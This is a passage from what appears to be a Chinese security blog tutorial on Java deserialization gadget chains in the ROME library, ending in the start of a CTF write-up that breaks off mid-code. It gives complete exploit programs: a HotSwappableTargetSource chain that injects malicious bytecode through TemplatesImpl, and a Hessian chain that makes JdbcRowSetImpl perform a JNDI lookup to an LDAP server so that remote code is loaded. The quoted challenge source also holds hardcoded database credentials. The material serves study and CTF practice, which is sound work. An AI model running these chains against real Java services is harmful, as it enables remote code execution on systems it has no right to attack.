&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="HotSwappableTargetSource利用链"><a href="#HotSwappableTargetSource利用链" class="headerlink" title="HotSwappableTargetSource利用链"></a>HotSwappableTargetSource利用链</h3><p>这条是spring原生的toString利用链，调用链如下</p><p>‍</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject() -&gt; HashMap#putVal -&gt; HotSwappableTargetSource#equals -&gt; XString.equals -&gt; ToStringBean.toString -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="利用链分析-2"><a href="#利用链分析-2" class="headerlink" title="利用链分析"></a>利用链分析</h4><p>‍</p><p>在<code>/Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/src.zip!/com/sun/org/apache/xpath/internal/objects/XString.java</code>​ 类下找到 equals方法可以调用<code>toString</code>​方法</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622067.png" alt="image">​</p><p>往上跟进找到</p><p>​<code>spring-aop-5.0.14.RELEASE.jar!/org/springframework/aop/target/HotSwappableTargetSource.java#equals()</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622528.png" alt="image">​</p><p>由于是equals()就想到了Hashmap这条，于是就跟完了</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME_HotSwappableTargetSource</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/Users/zjacky/Documents/Security-Testing/Java-Sec/Java-Sec-Payload/target/classes/Evail_Class/Calc.class&quot;</span>));<br><br><br>        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);<br><br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(toStringBean);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xxx&quot;</span>));<br><br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(h1,h1);<br>        hashMap.put(h2,h2);<br><br>        <span class="hljs-comment">//serialize(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622898.png" alt="image">​</p><p>‍</p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>‍</p><p>既然Rome可以任意触发getter方法，那必然想到Fastjson中的JdbcRowSetImpl的JNDI</p><p>‍</p><h4 id="利用链分析-3"><a href="#利用链分析-3" class="headerlink" title="利用链分析"></a>利用链分析</h4><p>‍</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Hessian#readObject() -&gt; HashMap#put()-&gt; ObjectBean#hashCode() -&gt; ToStringBean#toString(String) -&gt; JdbcRowSetImpl#getDatabaseMetaData()<br></code></pre></td></tr></table></figure><p>‍</p><p>问题出在<code>JdbcRowSetImpl#getDatabaseMetaData()</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622142.png" alt="image">​</p><p>‍</p><p>调用<code>this.connect();</code>​ 方法 跟进一下</p><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622364.png" alt="image">​</p><p>这个的话很明显的一个lookup函数配合JNDI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br></code></pre></td></tr></table></figure><p>‍</p><p>另一个函数就是<code>setDataSourceName</code>​去设置下我们JNDI查询的地址即可</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622754.png" alt="image">​</p><p>‍</p><p>他会调用父类的<code>setDataSourceName</code>​然后去设置<code>dataSource</code>​参数</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622120.png" alt="image">​</p><p>而lookup函数的参数其实就是datasource这个参数</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622406.png" alt="image">​</p><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Hessian;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_JNDI</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/1re2as&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-comment">//手动生成HashMap，防止提前调用hashcode()</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean,<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(hashMap);<br>        System.out.println(s);<br>        System.out.println((HashMap)deserialize(s));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">( Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622020.png" alt="image">​</p><p>‍</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h3><p>先给了 4 个 class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Test.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.controller;<br><br><span class="hljs-keyword">import</span> cn.abc.common.bean.ResponseCode;<br><span class="hljs-keyword">import</span> cn.abc.common.bean.ResponseResult;<br><span class="hljs-keyword">import</span> cn.abc.common.security.annotation.Access;<br><span class="hljs-keyword">import</span> cn.abc.core.sqldict.SqlDict;<br><span class="hljs-keyword">import</span> cn.abc.core.sqldict.Table;<br><span class="hljs-keyword">import</span> io.swagger.annotations.ApiOperation;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@CrossOrigin</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span><br>    <span class="hljs-meta">@Access</span><br>    <span class="hljs-meta">@ApiOperation(&quot;\u4e3a\u4e86\u5f00\u53d1\u65b9\u4fbf\u5bf9\u5e94\u6570\u636e\u5e93\u5b57\u5178\u67e5\u8be2&quot;)</span><br>    <span class="hljs-keyword">public</span> ResponseResult <span class="hljs-title function_">sqlDict</span><span class="hljs-params">(String dbName)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;abc@12345&quot;</span>);<br>        <span class="hljs-keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Row.class</span><br>一个构造方法和属性的getter/setter方法<br><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span> &#123;<br>    String name;<br>    String type;<br>    String def;<br>    String isNull;<br>    String isAuto;<br>    String remark;<br>    String isPK;<br>    String size;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsPK</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsPK</span><span class="hljs-params">(String isPK)</span> &#123;<br>        <span 